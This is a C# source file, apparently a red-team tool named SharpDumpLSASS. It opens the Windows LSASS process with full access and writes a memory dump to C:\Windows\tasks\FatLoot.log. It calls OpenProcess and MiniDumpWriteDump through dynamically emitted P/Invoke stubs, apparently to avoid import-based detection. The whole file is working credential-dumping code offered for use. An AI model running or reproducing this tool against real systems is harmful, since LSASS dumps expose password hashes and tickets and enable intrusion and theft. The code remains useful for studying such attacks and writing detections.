using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;

namespace SharpDumpLSASS
{
    class Program
    {
        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId)
        {
            var parameterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var arguments = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "OpenProcess", arguments, parameterTypes);
        }

        public static bool CloseHandle(IntPtr hObject)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hObject };
            return (bool)DynamicInvoke(typeof(bool), "Kernel32.dll", "CloseHandle", arguments, parameterTypes);
        }

        public static bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(int), typeof(IntPtr), typeof(int), typeof(IntPtr), typeof(IntPtr), typeof(IntPtr) };
            var arguments = new object[] { hProcess, ProcessId, hFile, DumpType, ExceptionParam, UserStreamParam, CallbackParam };
            return (bool)DynamicInvoke(typeof(bool), "Dbghelp.dll", "MiniDumpWriteDump", arguments, parameterTypes);
        }


        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\FatLoot.log", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            Console.WriteLine("");
            Console.WriteLine($"[*] LSASS PID: {lsass_pid}");

            Console.WriteLine("[*] Attempting to obtain handle to LSASS");

            IntPtr handle = OpenProcess(0x001F0FFF, false, (uint)lsass_pid);
            if (handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open the process.");
                return;
            }
            else
            {
                Console.WriteLine($"[*] obtained handle: { handle }");
            }

            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (dumped == false)
            {
                Console.WriteLine("[-] Failed to dump process");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Successfully dumped to {dumpFile.Name}");
            }

            if (!CloseHandle(handle))
            {
                Console.WriteLine("[*] Failed to close the handle");
            }

            else
            {
                Console.WriteLine($"[*] Handle { handle } succesfully closed ");
            }
        }
    }
}
